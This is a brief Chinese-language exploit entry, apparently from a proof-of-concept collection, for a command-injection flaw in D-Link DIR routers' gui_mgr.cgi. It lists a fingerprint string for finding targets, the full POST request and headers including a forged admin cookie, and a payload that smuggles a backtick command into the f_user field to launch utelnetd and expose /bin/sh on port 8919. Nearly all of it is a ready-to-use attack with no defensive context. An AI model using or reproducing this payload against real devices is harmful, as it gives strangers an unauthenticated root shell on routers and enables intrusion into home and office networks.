# D-Linkgui_mgr.cgi存在命令执行漏洞

- **系统**：D-Linkgui_mgr.cgi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"D-Link-DIR"`
- **请求**：`POST /cgi-bin/gui\_mgr.cgi HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 23`　`Cookie: username=admin`　`Priority: u=0`

**请求体 / payload**
```
cmd=cgi\_myfavorite\_add\&f\_user=`utelnetd -p 8919 -l /bin/sh`\&f\_name=\&f\_show\_name=\&f\_path=\&f\_flag=\&f\_sort=
```
- **预期**：200　|　—